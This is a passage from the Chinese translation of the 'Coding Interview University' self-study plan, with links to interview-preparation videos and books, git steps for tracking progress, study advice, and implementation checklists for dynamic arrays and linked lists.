href="#%E7%BB%88%E9%9D%A2">终面</a></li><li><a href="#%E7%BC%96%E7%A8%8B%E9%97%AE%E9%A2%98%E7%BB%83%E4%B9%A0">编程问题练习</a></li><li><a href="#%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0%E5%92%8C%E6%8C%91%E6%88%98">编程练习和挑战</a></li><li><a href="#%E5%BD%93%E4%BD%A0%E4%B8%B4%E8%BF%91%E9%9D%A2%E8%AF%95%E6%97%B6">当你临近面试时</a></li><li><a href="#%E4%BD%A0%E7%9A%84%E7%AE%80%E5%8E%86">你的简历</a></li><li><a href="#%E5%BD%93%E9%9D%A2%E8%AF%95%E6%9D%A5%E4%B8%B4%E7%9A%84%E6%97%B6%E5%80%99">当面试来临的时候</a></li><li><a href="#%E9%97%AE%E9%9D%A2%E8%AF%95%E5%AE%98%E7%9A%84%E9%97%AE%E9%A2%98">问面试官的问题</a></li><li><a href="#%E5%BD%93%E4%BD%A0%E8%8E%B7%E5%BE%97%E4%BA%86%E6%A2%A6%E6%83%B3%E7%9A%84%E8%81%8C%E4%BD%8D">当你获得了梦想的职位</a></li></ul><p>---------------- 下面的内容是可选的 ----------------</p><ul><li><a href="#%E9%A2%9D%E5%A4%96%E4%B9%A6%E7%B1%8D">额外书籍</a></li><li><a href="#%E9%99%84%E5%8A%A0%E5%AD%A6%E4%B9%A0">附加学习</a><ul><li><a href="#%E7%BC%96%E8%AF%91%E5%99%A8">编译器</a></li><li><a href="#emacs-and-vim">Emacs and vi(m)</a></li><li><a href="#unix-%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7">Unix 命令行工具</a></li><li><a href="#%E4%BF%A1%E6%81%AF%E8%AE%BA-%E8%A7%86%E9%A2%91">信息论</a></li><li><a href="#%E5%A5%87%E5%81%B6%E6%A0%A1%E9%AA%8C%E4%BD%8D--%E6%B1%89%E6%98%8E%E7%A0%81-%E8%A7%86%E9%A2%91">奇偶校验位 &amp; 汉明码 (视频)</a></li><li><a href="#%E7%B3%BB%E7%BB%9F%E7%86%B5%E5%80%BCEntropy">系统熵值</a></li><li><a href="#%E5%AF%86%E7%A0%81%E5%AD%A6">密码学</a></li><li><a href="#%E5%8E%8B%E7%BC%A9">压缩</a></li><li><a href="#%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8">计算机安全</a></li><li><a href="#%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6">垃圾回收</a></li><li><a href="#%E5%B9%B6%E8%A1%8C%E7%BC%96%E7%A8%8B">并行编程</a></li><li><a href="#%E6%B6%88%E6%81%AF%E4%BC%A0%E9%80%92%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E9%98%9F%E5%88%97%E7%B3%BB%E7%BB%9F">消息传递，序列化和队列化的系统</a></li><li><a href="#A%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95">A*搜索算法</a></li><li><a href="#%E5%BF%AB%E9%80%9F%E5%82%85%E9%87%8C%E5%8F%B6%E5%8F%98%E6%8D%A2">快速傅里叶变换</a></li><li><a href="#%E5%B8%83%E9%9A%86%E8%BF%87%E6%BB%A4%E5%99%A8">布隆过滤器</a></li><li><a href="#HyperLogLog">HyperLogLog</a></li><li><a href="#%E5%B1%80%E9%83%A8%E6%95%8F%E6%84%9F%E5%93%88%E5%B8%8C">局部敏感哈希</a></li><li><a href="#van-emde-boas-%E6%A0%91">van Emde Boas 树</a></li><li><a href="#%E5%A2%9E%E5%BC%BA%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84">增强数据结构</a></li><li><a href="#%E5%B9%B3%E8%A1%A1%E6%9F%A5%E6%89%BE%E6%A0%91balanced-search-trees">平衡查找树</a><ul><li>AVL 树</li><li>伸缩树（Splay tree）</li><li>红黑树</li><li>2-3 查找树</li><li>2-3-4 树(也称 2-4 树)</li><li>N-ary (K-ary, M-ary)树</li><li>B 树</li></ul></li><li><a href="#k-D%E6%A0%91">k-D 树</a></li><li><a href="#%E8%B7%B3%E8%A1%A8">跳表</a></li><li><a href="#%E7%BD%91%E7%BB%9C%E6%B5%81">网络流</a></li><li><a href="#%E4%B8%8D%E7%9B%B8%E4%BA%A4%E9%9B%86--%E8%81%94%E5%90%88%E6%9F%A5%E6%89%BE">不相交集 &amp; 联合查找</a></li><li><a href="#%E5%BF%AB%E9%80%9F%E5%A4%84%E7%90%86%E7%9A%84%E6%95%B0%E5%AD%A6">快速处理的数学</a></li><li><a href="#%E6%A0%91%E5%A0%86-treap">树堆 (Treap)</a></li><li><a href="#%E7%BA%BF%E6%80%A7%E8%A7%84%E5%88%92linear-programming%E8%A7%86%E9%A2%91">线性规划</a></li><li><a href="#%E5%87%A0%E4%BD%95%E5%87%B8%E5%8C%85geometry-convex-hull%E8%A7%86%E9%A2%91">几何：凸包（Geometry, Convex hull）</a></li><li><a href="#%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6">离散数学</a></li><li><a href="#%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0machine-learning">机器学习</a></li></ul></li><li><a href="#%E4%B8%80%E4%BA%9B%E4%B8%BB%E9%A2%98%E7%9A%84%E9%A2%9D%E5%A4%96%E5%86%85%E5%AE%B9">一些主题的额外内容</a></li><li><a href="#%E8%A7%86%E9%A2%91%E7%B3%BB%E5%88%97">视频系列</a></li><li><a href="#%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E8%AF%BE%E7%A8%8B">计算机科学课程</a></li><li><a href="#%E8%AE%BA%E6%96%87">论文</a></li></ul><hr><h2><span id="wei-he-yao-yong-dao-ta">为何要用到它？</span></h2><p>当我开始这个项目时，我不知道堆和栈的区别，不了解时间复杂度（Big-O）、树，或如何去遍历一个图。如果非要我去编写一个排序算法的话，我只能说我所写的肯定是很糟糕。一直以来，我所用的任何数据结构都是内建于编程语言当中。至于它们在背后是如何运作，对此我一概不清楚。此外，以前的我并不需要对内存进行管理，最多就只是在一个正在执行的进程抛出了“内存不足”的错误后，才会去找解决方法。在我的编程生涯中，虽然我有用过多维数组，也用过关联数组成千上万次，但我从来没有自己实现过数据结构。</p><p>这是一个漫长的计划，以至于花费了我数月的时间。若你早已熟悉大部分的知识，那么也许能节省大量的时间。</p><h2><span id="ru-he-shi-yong-ta">如何使用它</span></h2><p>下面所有的东西都只是一个概述。因此，你需要由上而下逐一地去处理它。</p><p>在学习过程中，我使用 GitHub 特殊语法的 markdown 去检查计划的进展，包括使用包含任务进度的任务列表。</p><p><strong>创建一个新的分支，以便你可以像这样去勾选计划的进展：直接往方括号中填写一个字符 x 即可：[x]</strong>。</p><pre><code>Fork一个分支，并跟随以下的指令</code></pre><p>通过单击 Fork 按钮来 fork GitHub 仓库：<a href="https://github.com/jwasham/coding-interview-university">jwasham/coding-interview-university</a></p><pre><code>克隆项目到本地</code></pre><p><code>git checkout -b progress</code></p><p><code>git remote add jwasham https://github.com/jwasham/coding-interview-university</code></p><p><code>git fetch --all</code></p><pre><code>在你完成了一些修改后，在框框中打 x</code></pre><p><code>git add .</code></p><p><code>git commit -m &quot;Marked x&quot;</code></p><p><code>git rebase jwasham/master</code></p><p><code>git push --set-upstream origin progress</code></p><p><code>git push --force</code></p><p><a href="https://guides.github.com/features/mastering-markdown/#GitHub-flavored-markdown">更多关于 Github-flavored markdown 的详情</a></p><h2><span id="bu-yao-jue-de-zi-ji-bu-gou-cong-ming">不要觉得自己不够聪明</span></h2><ul><li>大多数成功的软件工程师都非常聪明，但他们都有一种觉得自己不够聪明的不安全感。</li><li><a href="https://www.youtube.com/watch?v=0SARbwvhupQ">天才程序员的神话</a></li><li><a href="https://www.youtube.com/watch?v=1i8ylq4j_EY">不要单打独斗：面对技术中的隐形怪物</a></li></ul><h2><span id="xiang-guan-shi-pin-zi-yuan">相关视频资源</span></h2><p>部分视频只能通过在 Coursera 或者 Edx 课程上注册登录才能观看。这些视频被称为网络公开课程（MOOC）。有时候某些课程需要等待好几个月才能获取，这期间你无法观看这些课程的影片。</p><pre><code>很感谢你能帮我把网络公开课程的视频链接转换成公开的，可持续访问的视频源，比如 YouTube 视频，以代替那些在线课程的视频。此外，一些大学的讲座视频也是我所青睐的。</code></pre><h2><span id="mian-shi-guo-cheng-amp-tong-yong-de-mian-shi-zhun-bei">面试过程 &amp; 通用的面试准备</span></h2><ul><li>[ ] <a href="https://medium.com/always-be-coding/abc-always-be-coding-d5f8051afce2#.4heg8zvm4">ABC：不要停止编程（Always Be Coding）</a></li><li>[ ] <a href="https://medium.com/@dpup/whiteboarding-4df873dbba2e#.hf6jn45g1">白板编程（Whiteboarding）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=N233T0epWTs">揭秘技术招聘</a></li><li>[ ] 如何在科技四强企业中获得一份工作：<ul><li>[ ] <a href="https://www.youtube.com/watch?v=YJZCUhxNCv8">“如何在科技四强企业中获得一份工作 —— Amazon、Facebook、Google 和 Microsoft”（视频）</a></li></ul></li><li>[ ] 解密开发类面试第一集：<ul><li>[ ] <a href="https://www.youtube.com/watch?v=rEJzOhC5ZtQ">Gayle L McDowell —— 解密开发类面试（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=aClxtDcdpsQ">解密开发类面试 —— 作者 Gayle Laakmann McDowell（视频）</a></li></ul></li><li>[ ] 解密 Facebook 编码面试：<ul><li><a href="https://www.youtube.com/watch?v=wCl9kvQGHPI">方法</a></li><li><a href="https://www.youtube.com/watch?v=4UWDyJq8jZg">问题演练</a></li></ul></li><li>[ ] 准备课程：<ul><li>[ ] <a href="https://www.udemy.com/software-engineer-interview-unleashed">软件工程师面试发布（收费课程）</a>：<ul><li>从前 Google 面试官身上学习如何准备自己，让自己能够应付软件工程师的面试。</li></ul></li><li>[ ] <a href="https://www.udemy.com/python-for-data-structures-algorithms-and-interviews/">Python 数据结构，算法和面试（收费课程）</a>：<ul><li>Python 面试准备课程，内容涉及数据结构，算法，模拟面试等。</li></ul></li><li>[ ] <a href="https://www.udacity.com/course/data-structures-and-algorithms-in-python--ud513">Python 的数据结构和算法简介（Udacity 免费课程）</a>：<ul><li>免费的 Python 数据结构和算法课程。</li></ul></li><li>[ ] <a href="https://www.udacity.com/course/data-structures-and-algorithms-nanodegree--nd256">数据结构和算法纳米学位！（Udacity 收费纳米学位）</a>：<ul><li>获得超过100种数据结构和算法练习以及指导的动手练习，专门导师帮助你在面试和职场中做好准备。</li></ul></li><li>[ ] <a href="https://www.educative.io/courses/grokking-the-behavioral-interview">探究行为面试（Educative 免费课程）</a>：<ul><li>很多时候，不是你的技术能力会阻碍你获得理想的工作，而是你在行为面试中的表现。</li></ul></li></ul></li></ul><h2><span id="wei-ni-de-mian-shi-xuan-ze-yi-chong-yu-yan">为你的面试选择一种语言</span></h2><p>你可以在编程这一环节，使用一种自己用起来较为舒适的语言去完成编程，但对于大公司，你只有三种固定的选择：</p><ul><li>C++</li><li>Java</li><li>Python</li></ul><p>你也可以使用下面两种编程语言，但可能会有某些限制，你需要实现查明：</p><ul><li>JavaScript</li><li>Ruby</li></ul><p>我之前写过一篇关于在面试时选择编程语言的文章：<a href="https://startupnextdoor.com/important-pick-one-language-for-the-coding-interview/">为编程面试选择一种语言</a>。</p><p>你需要对你所选择的语言感到非常舒适且足够了解。</p><p>更多关于语言选择的阅读：</p><ul><li><a href="http://www.byte-by-byte.com/choose-the-right-language-for-your-coding-interview/">http://www.byte-by-byte.com/choose-the-right-language-for-your-coding-interview/</a></li><li><a href="http://blog.codingforinterviews.com/best-programming-language-jobs/">http://blog.codingforinterviews.com/best-programming-language-jobs/</a></li></ul><p><a href="../programming-language-resources.md">在此查看相关语言的资源</a></p><p>由于我正在学习C、C++ 和 Python，因此在下面你会看到部分关于它们的学习资料。相关书籍请看文章的底部。</p><h2><span id="shu-dan">书单</span></h2><p>为了节省你的时间，以下是比我使用过的更缩减的书单。</p><h3><span id="mian-shi-zhun-bei">面试准备</span></h3><ul><li>[ ] <a href="https://www.amazon.com/Programming-Interviews-Exposed-Through-Interview/dp/111941847X/">Programming Interviews Exposed: Coding Your Way Through the Interview, 4th Edition</a><ul><li>附有 C++ 和 Java 解答</li><li>这是在练习 Cracking the Coding Interview 之前一个很好的热身</li><li>不太困难，大多数问题可能比你在面试中看到的要容易（根据我的阅读）</li></ul></li><li>[ ] <a href="http://www.amazon.com/Cracking-Coding-Interview-6th-Programming/dp/0984782850/">Cracking the Coding Interview, 6th Edition</a><ul><li>附有 Java 答案</li></ul></li></ul><h3><span id="ru-guo-ni-you-e-wai-de-shi-jian">如果你有额外的时间：</span></h3><p>选择以下之一：</p><ul><li>[ ] <a href="https://www.amazon.com/Elements-Programming-Interviews-Insiders-Guide/dp/1479274836">Elements of Programming Interviews (C++ version)</a></li><li>[ ] <a href="https://www.amazon.com/Elements-Programming-Interviews-Python-Insiders/dp/1537713949/">Elements of Programming Interviews in Python</a></li><li>[ ] Elements of Programming Interviews (Java version)<ul><li><a href="https://www.amazon.com/Elements-Programming-Interviews-Java-Insiders/dp/1517435803/">书</a></li><li><a href="https://github.com/gardncl/elements-of-programming-interviews">配套项目──书中每个问题的方法和测试用例</a></li></ul></li></ul><h3><span id="bian-cheng-yu-yan-jing-xuan">编程语言精选</span></h3><p><strong>你需要选择面试语言（请参见上文）。</strong></p><p>这是我按语言给出的建议。我没有所有语言的资源，欢迎贡献。</p><p>如果你通读其中之一，你应该具备了开始解决编程问题所需的所有数据结构和算法知识。除非你需要复习，否则<strong>你可以跳过此项目中的所有视频讲座</strong>。</p><p><a href="https://github.com/jwasham/coding-interview-university/blob/master/programming-language-resources.md">额外编程语言的精选资源</a></p><h3><span id="c">C++</span></h3><p>我没有读过这两本书，但是它们颇受好评，作者是 Sedgewick，他非常厉害。</p><ul><li>[ ] <a href="https://www.amazon.com/Algorithms-Parts-1-4-Fundamentals-Structure/dp/0201350882/">Algorithms in C++, Parts 1-4: Fundamentals, Data Structure, Sorting, Searching</a></li><li>[ ] <a href="https://www.amazon.com/Algorithms-Part-Graph-3rd-Pt-5/dp/0201361183/">Algorithms in C++ Part 5: Graph Algorithms</a></li><li>[ ] <a href="https://opendatastructures.org/ods-cpp.pdf">Open Data Structures in C++</a><ul><li>丰富而详细的数据结构和算法集合</li><li>非常适合初学者</li></ul></li></ul><p>如果你有更好的 C++ 书籍，请告诉我。我正在搜集全面的资源。</p><h3><span id="java">Java</span></h3><ul><li>[ ] <a href="https://www.amazon.com/Algorithms-4th-Robert-Sedgewick/dp/032157351X/">算法（Sedgewick 和 Wayne）</a><ul><li>包含课程内容（和Sedgewick！）的视频<ul><li><a href="https://www.coursera.org/learn/algorithms-part1">第一部分</a></li><li><a href="https://www.coursera.org/learn/algorithms-part2">第二部分</a></li></ul></li></ul></li></ul><p>或者：</p><ul><li>[ ] <a href="https://www.amazon.com/Data-Structures-Algorithms-Michael-Goodrich/dp/1118771338/">Java 数据结构和算法</a><ul><li>作者：Goodrich、Tamassia、Goldwasser</li><li>用作 UC Berkeley 的 CS 入门课程的可选教材</li><li>请参阅下面有关 Python 版本的我的读书报告，这本书涵盖了相同的主题</li></ul></li></ul><h3><span id="python">Python</span></h3><ul><li>[ ] <a href="https://www.amazon.com/Structures-Algorithms-Python-Michael-Goodrich/dp/1118290275/">Python数据结构和算法</a><ul><li>作者：Goodrich、Tamassia、Goldwasser</li><li>我非常喜爱这本书，它包含了所有东西</li><li>很 Python 的代码</li><li>我的读书报告：<a href="https://startupnextdoor.com/book-report-data-structures-and-algorithms-in-python/">startupnextdoor.com/book-report-data-structures-and-algorithms-in-python</a></li></ul></li><li>[ ] <a href="https://opendatastructures.org/ods-python.pdf">Open Data Structures in Python</a></li></ul><h2><span id="zai-ni-kai-shi-zhi-qian">在你开始之前</span></h2><p>该列表已经持续更新了很长的一段时间，所以，我们的确很容易会对其失去控制。</p><p>这里列出了一些我所犯过的错误，希望你不要重滔覆辙。</p><h3><span id="1-ni-bu-ke-neng-ba-suo-you-de-dong-xi-du-ji-zhu">1. 你不可能把所有的东西都记住</span></h3><p>就算我观看了数小时的视频，并记录了大量的笔记，几个月后的我，仍然会忘却其中大部分的东西。所以，我花了3天翻阅我的笔记，并制作成抽认卡（flashcard）帮助我复习：</p><p>请阅读以下的文章以免重蹈覆辙:</p><p><a href="https://startupnextdoor.com/retaining-computer-science-knowledge/">记住计算机科学知识</a>。</p><p>有人推荐给我的课程（但我还沒看过）：<a href="https://www.coursera.org/learn/learning-how-to-learn">学习如何学习</a>。</p><h3><span id="2-shi-yong-chou-ren-qia">2. 使用抽认卡</span></h3><p>为了解决善忘的问题，我制作了一个抽认卡的网页，用于添加两种抽认卡：一般的及带有代码的。每种卡都会有不同的格式设计。</p><p>而且，我还以移动设备为先去设计这些网页，以使得在任何地方，我都能通过我的手机及平板去回顾知识。</p><p>你也可以免费制作属于你自己的抽认卡网站：</p><ul><li><a href="https://github.com/jwasham/computer-science-flash-cards">抽认卡页面的代码仓库</a></li><li><a href="https://github.com/jwasham/computer-science-flash-cards/blob/master/cards-jwasham.db">我的抽认卡数据库 ── 旧 1200 张</a></li><li><a href="https://github.com/jwasham/computer-science-flash-cards/blob/master/cards-jwasham-extreme.db">我的抽认卡数据库 ── 新 1800 张</a></li></ul><p>有一点需要记住的是，我做事有点过头，以至于卡片都覆盖到所有的东西上，从汇编语言和 Python 的细枝末节，到机器学习和统计都被覆盖到卡片上。而这种做法，对于要求来说是多余的。</p><p><strong>在抽认卡上做笔记：</strong> 若你第一次发现你知道问题的答案时，先不要急着把其标注成“已知”。反复复习这张抽认卡，直到每次都能答对后才是真正学会了这个问题。反复地问答可帮助你深刻记住该知识点。</p><p>这里有个替代我抽认卡的网站 <a href="http://ankisrs.net/">Anki</a>，很多人向我推荐过它。这个网站用同一个字卡重复出现的方式让你牢牢地记住知识。这个网站非常容易使用，支持多平台，并且有云端同步功能。在 iOS 平台上收费25美金，其他平台免费。</p><p>这是我用 Anki 这个网站里的格式所储存的抽认卡资料库: <a href="http://ankiweb.net/shared/info/25173560">ankiweb.net/shared/info/25173560</a> （感谢 <a href="https://github.com/xiewenya">@xiewenya</a>）</p><h3><span id="3-fu-xi-fu-xi-zai-fu-xi">3. 复习，复习，再复习</span></h3><p>我留有一组 ASCII 码表、OSI 堆栈、Big-O 记号及更多的抽认卡，以便在空余的时候可以学习。</p><p>编程累了就休息半个小时，并去复习你的抽认卡。</p><h3><span id="4-zhuan-zhu">4. 专注</span></h3><p>在学习的过程中，往往会有许多令人分心的事占据着我们宝贵的时间。因此，专注和集中注意力是非常困难的。放点纯音乐能帮上一些忙。</p><h2><span id="mei-you-bao-han-de-nei-rong">没有包含的内容</span></h2><p>有一些熟悉且普遍的技术在此未被谈及到：</p><ul><li>SQL</li><li>Javascript</li><li>HTML、CSS 和其他前端技术</li></ul><h2><span id="ri-chang-ji-hua">日常计划</span></h2><p>部分问题可能会花费一天的时间去学习，而有些则会花费多天。当然，有些学习并不需要我们懂得如何实现。</p><p>因此，每一天我都会在下面所列出的列表中选择一项，并观看相关的视频。然后，使用以下的一种语言去实现：</p><ul><li>C —— 使用结构体和函数，该函数会接受一个结构体指针 * 及其他数据作为参数。</li><li>C++ —— 不使用内建的数据类型。</li><li>C++ —— 使用内建的数据类型，如使用 STL 的 std::list 来作为链表。</li><li>Python ——  使用内建的数据类型（为了持续练习 Python），并编写一些测试去保证自己代码的正确性。有时，只需要使用断言函数 assert() 即可。</li><li>此外，你也可以使用 Java 或其他语言。以上只是我的个人偏好而已。</li></ul><p>你不需要学会所有的编程语言，你只需要专注在<a href="##%E4%B8%BA%E4%BD%A0%E7%9A%84%E9%9D%A2%E8%AF%95%E9%80%89%E6%8B%A9%E4%B8%80%E7%A7%8D%E8%AF%AD%E8%A8%80">一种编程语言</a>上。</p><p>为何要在这些语言上分别实现一次？</p><ul><li>练习，练习，练习，直至我厌倦它，并正确无误地实现出来。（若有部分边缘条件没想到时，我会用书写的形式记录下来并去记忆）</li><li>在纯原生的条件下工作（不需垃圾回收机制的帮助下，手动分配/释放内存（除了 Python））</li><li>利用语言内建的数据类型，之后在实际工作的时候才能得心应手（在生产环境中，我不会去实现自己的链表）</li></ul><p>就算我没有时间去每一项都这么做，但我也会尽我所能。</p><p>在这里你可以查看到我的代码：</p><ul><li><a href="https://github.com/jwasham/practice-c">C</a></li><li><a href="https://github.com/jwasham/practice-cpp">C++</a></li><li><a href="https://github.com/jwasham/practice-python">Python</a></li></ul><p>你不需要记住每一个算法的内部原理。</p><p>在一个白板上写代码，而不要直接在计算机上编写。在测试完部分简单的输入后，到计算机上再测试一遍。</p><h2><span id="bi-bei-zhi-shi">必备知识</span></h2><ul><li><p>[ ] <strong>学习C语言</strong></p><ul><li>C 语言无处不在。在学习的过程中，你会在书籍，讲座，视频等任何地方看到它的身影</li><li>[ ] <a href="https://www.amazon.com/Programming-Language-Brian-W-Kernighan/dp/0131103628">C程序设计语言，第二版</a><ul><li>这是一本简短的书，但是它将使你更好地使用 C 语言，并且如果你稍加练习，就会很快熟练。理解 C 可帮助你了解程序和内存的工作方式</li><li>问题答案</li></ul></li></ul></li><li><p>[ ] <strong>计算机是如何处理一段程序：</strong></p><ul><li>[ ] <a href="https://www.youtube.com/watch?v=XM4lGflQFvA">CPU 是如何执行代码（视频）</a></li><li>[ ] <a href="https://youtu.be/1I5ZMmrOfnA">计算机如何计算（视频）</a></li><li>[ ] <a href="https://youtu.be/fpnE6UAfbtU">寄存器和内存（视频）</a></li><li>[ ] <a href="https://youtu.be/FZGugFqdr60">中央处理单元（视频）</a></li><li>[ ] <a href="https://youtu.be/zltgXvg6r3k">指令和程序（视频）</a></li></ul></li></ul><h2><span id="suan-fa-fu-za-du-big-o-jian-jin-fen-xi-fa">算法复杂度 / Big-O / 渐进分析法</span></h2><ul><li>并不需要实现</li><li>这里有很多视频，看到你真正了解它为止。你随时可以回来复习。</li><li>如果这些课程太过数学的话，你可以去看看最下面离散数学的视频，它能让你更了解这些数学背后的来源以及原理。</li><li>[ ] <a href="https://www.youtube.com/watch?v=iOq5kSKqeR4">Harvard CS50 —— 渐进表示（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=V6mKVRU1evU">Big O 记号（通用快速教程）（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=ei-A_wy5Yxw&amp;index=2&amp;list=PL1BaGV1cIH4UhkL8a9bJGG356covJ76qN">Big O 记号（以及 Omega 和 Theta）——  最佳数学解释（视频）</a></li><li>[ ] Skiena 算法：<ul><li><a href="https://www.youtube.com/watch?v=gSyDMtdPNpU&amp;index=2&amp;list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b">视频</a></li><li><a href="http://www3.cs.stonybrook.edu/~algorith/video-lectures/2007/lecture2.pdf">幻灯片</a></li></ul></li><li>[ ] <a href="http://discrete.gr/complexity/">对于算法复杂度分析的一次详细介绍</a></li><li>[ ] <a href="https://class.coursera.org/algorithmicthink1-004/lecture/59">增长阶数（Orders of Growth）（视频）</a></li><li>[ ] <a href="https://class.coursera.org/algorithmicthink1-004/lecture/61">渐进性（Asymptotics）（视频）</a></li><li>[ ] <a href="https://youtu.be/VIS4YDpuP98">UC Berkeley Big O（视频）</a></li><li>[ ] <a href="https://youtu.be/ca3e7UVmeUc">UC Berkeley Big Omega（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=B3SpQZaAZP4&amp;index=10&amp;list=PL1BaGV1cIH4UhkL8a9bJGG356covJ76qN">平摊分析法（Amortized Analysis）（视频）</a></li><li>[ ] <a href="https://class.coursera.org/algorithmicthink1-004/lecture/63">举证“Big O”（视频）</a></li><li>[ ] TopCoder（包括递归关系和主定理）：<ul><li><a href="https://www.topcoder.com/community/data-science/data-science-tutorials/computational-complexity-section-1/">计算性复杂度：第一部</a></li><li><a href="https://www.topcoder.com/community/data-science/data-science-tutorials/computational-complexity-section-2/">计算性复杂度：第二部</a></li></ul></li><li>[ ] <a href="http://bigocheatsheet.com/">速查表（Cheat sheet）</a></li></ul><h2><span id="shu-ju-jie-gou">数据结构</span></h2><ul><li><h3><span id="shu-zu-arrays">数组（Arrays）</span></h3><ul><li>实现一个可自动调整大小的动态数组。</li><li>[ ] 介绍：<ul><li><a href="https://www.coursera.org/learn/data-structures/lecture/OsBSF/arrays">数组（视频）</a></li><li><a href="https://archive.org/details/ucberkeley_webcast_Wp8oiO_CZZE">UC Berkeley CS61B - 线性数组和多维数组（视频）</a>（从15分32秒开始）</li><li><a href="https://archive.org/details/0102WhatYouShouldKnow/02_04-basicArrays.mp4">数组的基础知识（视频）</a></li><li><a href="https://archive.org/details/0102WhatYouShouldKnow/02_05-multidimensionalArrays.mp4">多维数组（视频）</a></li><li><a href="https://www.coursera.org/learn/data-structures/lecture/EwbnV/dynamic-arrays">动态数组（视频）</a></li><li><a href="https://www.youtube.com/watch?v=1jtrQqYpt7g">不规则数组（视频）</a></li><li><a href="https://archive.org/details/0102WhatYouShouldKnow/02_06-jaggedArrays.mp4">不规则数组（视频）</a></li><li><a href="https://archive.org/details/0102WhatYouShouldKnow/03_01-resizableArrays.mp4">调整数组的大小（视频）</a></li></ul></li><li>[ ] 实现一个动态数组（可自动调整大小的可变数组）：<ul><li>[ ] 练习使用数组和指针去编码，并且指针是通过计算去跳转而不是使用索引</li><li>[ ] 通过分配内存来新建一个原生数据型数组<ul><li>可以使用 int 类型的数组，但不能使用其语法特性</li><li>从大小为16或更大的数（使用2的倍数 —— 16、32、64、128）开始编写</li></ul></li><li>[ ] size() —— 数组元素的个数</li><li>[ ] capacity() —— 可容纳元素的个数</li><li>[ ] is_empty()</li><li>[ ] at(index) —— 返回对应索引的元素，且若索引越界则愤然报错</li><li>[ ] push(item)</li><li>[ ] insert(index, item) —— 在指定索引中插入元素，并把后面的元素依次后移</li><li>[ ] prepend(item) —— 可以使用上面的 insert 函数，传参 index 为 0</li><li>[ ] pop() —— 删除在数组末端的元素，并返回其值</li><li>[ ] delete(index) —— 删除指定索引的元素，并把后面的元素依次前移</li><li>[ ] remove(item) —— 删除指定值的元素，并返回其索引（即使有多个元素）</li><li>[ ] find(item) —— 寻找指定值的元素并返回其中第一个出现的元素其索引，若未找到则返回 -1</li><li>[ ] resize(new_capacity) // 私有函数<ul><li>若数组的大小到达其容积，则变大一倍</li><li>获取元素后，若数组大小为其容积的1/4，则缩小一半</li></ul></li></ul></li><li>[ ] 时间复杂度<ul><li>在数组末端增加/删除、定位、更新元素，只允许占 O(1) 的时间复杂度（平摊（amortized）去分配内存以获取更多空间）</li><li>在数组任何地方插入/移除元素，只允许 O(n) 的时间复杂度</li></ul></li><li>[ ] 空间复杂度<ul><li>因为在内存中分配的空间邻近，所以有助于提高性能</li><li>空间需求 = （大于或等于 n 的数组容积）* 元素的大小。即便空间需求为 2n，其空间复杂度仍然是 O(n)</li></ul></li></ul></li><li><h3><span id="lian-biao-linked-lists">链表（Linked Lists）</span></h3><ul><li>[ ] 介绍：<ul><li>[ ] <a href="https://www.coursera.org/learn/data-structures/lecture/kHhgK/singly-linked-lists">单向链表（视频）</a></li><li>[ ] <a href="https://archive.org/details/ucberkeley_webcast_htzJdKoEmO0">CS 61B —— 链表（一）（视频）</a></li><li>[ ] <a href="https://archive.org/details/ucberkeley_webcast_-c4I3gFYe3w">CS 61B —— 链表（二）（视频）</a></li></ul></li><li>[ ] <a href="https://www.youtube.com/watch?v=QN6FPiD0Gzo">C 代码（视频）</a> ── 并非看完整个视频，只需要看关于节点结构和内存分配那一部分即可</li><li>[ ] 链表 vs 数组：<ul><li><a href="https://www.coursera.org/lecture/data-structures-optimizing-performance/core-linked-lists-vs-arrays-rjBs9">基本链表 Vs 数组（视频）</a></li><li><a href="https://www.coursera.org/lecture/data-structures-optimizing-performance/in-the-real-world-lists-vs-arrays-QUaUd">在现实中，链表 Vs 数组（视频）</a></li></ul></li><li>[ ] <a href="https://www.youtube.com/watch?v=YQs6IC-vgmo">为什么你需要避免使用链表（视频）</a></li><li>[ ] 的确：你需要关于“指向指针的指针”的相关知识：（因为当你传递一个指针到一个函数时，该函数可能会改变指针所指向的地址）该页只是为了让你了解“指向指针的指针”这一概念。但我并不推荐这种链式遍历的风格。因为，这种风格的代码，其可读性和可维护性太低。<ul><li><a href="https://www.eskimo.com/~scs/cclass/int/sx8.html">指向指针的指针</a></li></ul></li><li>[ ] 实现（我实现了使用尾指针以及没有使用尾指针这两种情况）：<ul><li>[ ] size() —— 返回链表中数据元素的个数</li><li>[ ] empty() —— 若链表为空则返回一个布尔值 true</li><li>[ ] value_at(index) —— 返回第 n 个元素的值（从0开始计算）</li><li>[ ] push_front(value) —— 添加元素到链表的首部</li><li>[ ] pop_front() —— 删除首部元素并返回其值</li><li>[ ] push_back(value) —— 添加元素到链表的尾部</li><li>[ ] pop_back() —— 删除尾部元素并返回其值</li><li>[ ] front() —— 返回首部元素的值</li><li>[ ] back() —— 返回尾部元素的值</li><li>[ ] insert(index, value) —— 插入值到指定的索引，并把当前索引的元素指向到新的元素</li><li>[ ] erase(index) —— 删除指定索引的节点</li><li>[ ] value_n_from_end(n) —— 返回倒数第 n 个节点的值</li><li>[ ] reverse() —— 逆序链表</li><li>[ ] remove_value(value) —— 删除链表中指定值的第一个元素</li></ul></li><li>[ ] 双向链表<ul><li><a href="https://www.coursera.org/learn/data-structures/lecture/jpGKD/doubly-linked-lists">介绍（视频）</a></li><li>并不需要实现</li></ul></li></ul></li><li><h3><span id="dui-zhan-stack">堆栈（Stack）</span></h3><ul><li>[ ] <a href="https://www.coursera.org/learn/data-structures/lecture/UdKzQ/stacks">堆栈（视频）</a></li><li>[ ] <a 